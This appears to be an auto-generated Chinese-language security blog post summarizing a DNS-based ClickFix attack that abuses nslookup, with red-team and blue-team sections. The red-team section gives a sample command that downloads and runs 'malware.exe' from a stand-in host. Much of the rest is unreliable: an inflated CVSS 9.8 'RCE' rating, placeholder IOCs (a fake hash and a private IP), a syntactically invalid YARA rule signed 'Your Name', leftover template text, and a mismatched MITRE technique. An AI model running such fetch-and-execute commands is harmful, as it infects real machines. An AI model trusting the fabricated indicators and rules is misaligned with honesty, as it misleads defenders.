---
layout: post
title:  "Microsoft Discloses DNS-Based ClickFix Attack Using Nslookup for Malware Staging"
date:   2026-02-15 18:26:39 +0000
categories: [security]
severity: critical
---

# 🚨 解析 ClickFix 攻擊技術：DNS 基礎的社交工程
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: DNS Tunneling, Social Engineering, Malware Delivery

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: ClickFix 攻擊利用了人類的信任和習慣，透過社交工程手法誘導使用者執行惡意命令，進而下載和執行木馬程式。
* **攻擊流程圖解**:
  1. 攻擊者發送釣魚郵件或 malvertising 連結至受害者。
  2. 受害者點擊連結，進入假的 CAPTCHA 驗證頁面。
  3. 受害者按照指示，透過 Windows Run 對話框執行 `nslookup` 命令，進行 DNS 查詢。
  4. DNS 查詢結果包含惡意 payload，受害者不知不覺地下載和執行了木馬程式。
* **受影響元件**: Windows 作業系統，尤其是使用 DNS 的應用程式。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 受害者需要有網際網路連線和 Windows 作業系統。
* **Payload 建構邏輯**:

    ```
    
    python
      import os
    
      # DNS 查詢命令
      dns_query = "nslookup -type=txt example.com"
    
      # 執行 DNS 查詢命令
      os.system(dns_query)
    
    ```
  *範例指令*: `curl -X GET 'http://example.com/malware' -o malware.exe && malware.exe`
* **繞過技術**: 攻擊者可以使用 DNS Tunneling 技術，透過 DNS 查詢隧道傳輸惡意 payload，避免被防火牆和入侵偵測系統發現。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | C:\Windows\Temp\malware.exe |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule ClickFix_Detection {
        meta:
          description = "Detects ClickFix malware"
          author = "Your Name"
        strings:
          $dns_query = "nslookup -type=txt example.com"
        condition:
          $dns_query in (command_line)
      }
    
    ```
  *或者是具體的 SIEM 查詢語法 (Splunk/Elastic)*: `index=windows_event_log EventID=4688 CommandLine="nslookup -type=txt example.com"`
* **緩解措施**: 除了更新修補之外，還可以設定 DNS 伺服器只允許特定的查詢，限制使用者執行命令的權限，並監控系統的異常行為。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **DNS Tunneling (DNS 隧道技術)**: 一種利用 DNS 查詢隧道傳輸資料的技術，常用於繞過防火牆和入侵偵測系統。
* **Social Engineering (社交工程)**: 一種利用人類的心理和習慣進行攻擊的技術，常用於誘導使用者執行惡意命令或提供敏感資料。
* **Malware Delivery (木馬程式傳輸)**: 一種利用各種手法傳輸木馬程式到受害者系統的技術，常用於下載和執行惡意 payload。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/02/microsoft-discloses-dns-based-clickfix.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


